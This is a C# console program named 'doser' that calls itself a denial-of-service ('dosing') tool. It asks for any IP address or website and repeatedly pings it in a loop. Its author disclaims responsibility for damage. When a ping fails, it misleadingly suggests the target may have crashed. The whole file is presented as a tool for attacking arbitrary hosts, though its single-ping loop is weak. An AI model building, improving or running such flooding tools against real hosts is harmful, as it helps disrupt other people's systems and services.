using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net.NetworkInformation;
using System.Net;
using System.IO;
using System.Threading;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Diagnostics;

namespace doser
{
    class Program
    {
        static string ip;
        static Ping p = new Ping();
        static PingReply reply;
        static void Main(string[] args)
        {
            l:
            int counter = 0;
            bool atv = true;
            string logo = @" __     __     __  ___   _";
            string logo1 = @"|  \   /  \   /    |__  | \";
            string logo2 = @"|   | |    |  \_   |__  |_/";
            string logo3 = @"|__/   \__/   __/  |__  | \";
            Console.Title = "doser";
            Console.BackgroundColor = ConsoleColor.DarkBlue;
            Console.ForegroundColor = ConsoleColor.White;
            Console.Clear();
            Console.WriteLine(logo);
            Console.WriteLine(logo1);
            Console.WriteLine(logo2);
            Console.WriteLine(logo3 + "\n");
            Console.WriteLine("shadowdev is not responsible for any kinds of damages");
            Console.WriteLine("if you are using this on an website then you must do it like this");
            Console.WriteLine(@"www.example.com not like this http:\\example.com\");
            Console.WriteLine("write commands to show commands");
            Console.WriteLine("doser v1.0.0.6");
            Console.Write("enter valid ip adress/website: ");
            ip = Console.ReadLine();
            if (ip == "commands")
            {
                ip = "";
                Console.WriteLine($"\n'about' shows what is new\n'exit' exits\n'commands' shows commands");
                Console.ReadLine();
                Console.Clear();
                goto l;
            }
            if (ip == "about")
            {
                ip = "";
                Console.WriteLine("\ndoser is a minimalistic dosing tool\n\ncreated by shadowdev");
                Console.ReadLine();
                Console.Clear();
                goto l;
            }
            if (ip == "exit")
            {
                ip = "";
                Environment.Exit(0);
            }
            while (atv == true)
            {
                if (Console.KeyAvailable && Console.ReadKey(true).Key == ConsoleKey.E) break;
                try
                {
                    reply = p.Send(ip, 10000);
                    Thread.Sleep(10);
                    Console.WriteLine("ip adress: " + reply.Address + ") completed in:"  + reply.RoundtripTime + "ms");
                    if (counter == 20)
                    {
                        Console.Clear();
                        counter = 0;
                        Console.WriteLine(logo);
                        Console.WriteLine(logo1);
                        Console.WriteLine(logo2);
                        Console.WriteLine(logo3 + "\n");
                    }
                    else
                    {
                        if (reply.RoundtripTime == 0)
                        {
                            atv = false;
                        }else
                        {
                            counter++;
                        }
                    }
                }catch
                {
                    atv = false;
                }
                finally
                {
                    if (atv == false)
                    {
                        Console.WriteLine("\nhost is unable to get a ping\nthere is a couple reasons why this is happening\nn.1 you or the host is offline\nn.2 the hosts system crashed");
                        Console.ReadLine();
                        Console.Clear();
                    }
                }
            }
            goto l;
        }
    }
}
